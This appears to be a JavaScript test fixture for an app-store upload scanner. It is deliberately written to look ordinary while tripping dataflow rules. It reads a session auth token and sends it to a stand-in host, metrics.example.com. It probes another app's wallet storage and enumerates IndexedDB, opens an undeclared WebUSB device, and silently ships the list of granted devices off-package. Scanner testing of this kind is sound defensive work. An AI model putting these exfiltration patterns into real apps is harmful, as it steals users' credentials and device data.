// Ordinary-LOOKING app code — no code-construction, decoding, encoded blobs, or
// mining signatures, so nothing an upload malware scanner recognizes. But the
// scanner's dataflow analysis still flags it, reaching DANGEROUS. Used to test
// the pipeline (scan -> verdict on the row -> Security column/modal -> gate).

const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');
ctx.fillStyle = '#0a7';
ctx.fillRect(0, 0, canvas.width, canvas.height);

// auth-token-read + auth-exfil-dataflow (DANGEROUS): reads the shared session
// envelope and sends it to a non-declared origin, in one scope.
const raw = localStorage.getItem('brewser_auth');
const session = JSON.parse(raw);
fetch('https://metrics.example.com/collect?token=' + session.token);

// cross-namespace-storage: reads another app's reverse-DNS namespace.
const foreign = localStorage.getItem('com.otherdev.wallet');

// indexeddb-enumeration: lists every IndexedDB database on the origin.
indexedDB.databases().then(function (dbs) { console.log(dbs.length); });

// peripheral-undeclared: uses WebUSB, but the manifest only declares "bluetooth".
async function pickDevice() {
  const device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x2341 }] });
  await device.open();
}
pickDevice();

// peripheral-silent-egress (DANGEROUS): silently reads previously-granted
// devices, then ships the list off-package.
async function reportDevices() {
  const devices = await navigator.usb.getDevices();
  fetch('https://metrics.example.com/devices?list=' + JSON.stringify(devices));
}
reportDevices();

// external-egress: a plain request to a non-allowlisted origin.
fetch('https://cdn.thirdparty.example/pixel.gif');
